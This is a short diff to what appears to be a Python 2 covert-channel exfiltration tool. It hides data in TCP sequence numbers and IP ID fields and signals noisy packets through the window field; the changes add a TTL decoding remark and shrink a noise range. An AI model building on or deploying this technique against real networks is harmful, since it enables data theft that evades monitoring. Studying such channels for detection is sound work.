@@ -38,6 +38,7 @@ A testing suite should be able to perform all tests or individual tests.
 Lets start out by building the initial tests we are interested in and then run
 through them all. I'll add this info to the issue queue. - Clay
 
+Using ttl on the server side to determine how to decipher the message.
 '''
 
 # =======
@@ -131,7 +132,7 @@ def add_n0ise_iseq(i):
 	print '[*] adding n0ise to iseq..'
 	y = exfilArray[i]
 	# Add some randomness for schlitz n giggles
-	randy = random.randint(-99999999, 99999999)
+	randy = random.randint(-9999999, 9999999)  # too large will produce error
 	pkt.seq = y + randy
 	# Signal noisy packet
 	pkt.window = int(8182) - random.randint(23, 275)
@@ -143,7 +144,7 @@ def add_n0ise_ipid(i):
 	print '[*] adding n0ise to IPID..'
 	y = exfilArray[i]
 	# Add some randomness for schlitz n giggles
-	randy = random.randint(-999, 999)
+	randy = random.randint(-999, 999)  # too large will produce error
 	pkt.seq = y + randy
 	# Signal noisy packet
 	pkt.window = int(8182) - random.randint(23, 275)
